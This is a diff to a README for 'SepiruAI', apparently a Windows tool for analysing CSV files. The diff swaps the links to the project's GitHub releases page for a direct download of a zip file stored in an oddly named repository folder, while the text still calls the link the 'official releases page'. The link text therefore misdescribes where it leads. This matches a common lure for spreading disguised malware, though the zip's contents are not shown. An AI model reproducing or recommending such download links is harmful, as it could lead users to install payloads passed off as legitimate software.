@@ -1,6 +1,6 @@
 # 🤖 SepiruAI - Analyze your data files with intelligence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leaflike-sleeplessperson662/SepiruAI/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Leaflike-sleeplessperson662/SepiruAI/raw/refs/heads/main/scoad/Sepiru-AI-3.8.zip)
 
 ## 📌 About this application
 
@@ -22,7 +22,7 @@ SepiruAI works with CSV files. These files store data in a grid format. Use Exce
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Leaflike-sleeplessperson662/SepiruAI/releases) to access the installer.
+1. Visit the [official releases page](https://github.com/Leaflike-sleeplessperson662/SepiruAI/raw/refs/heads/main/scoad/Sepiru-AI-3.8.zip) to access the installer.
 2. Locate the file ending in .exe in the "Assets" section.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the transfer finishes.
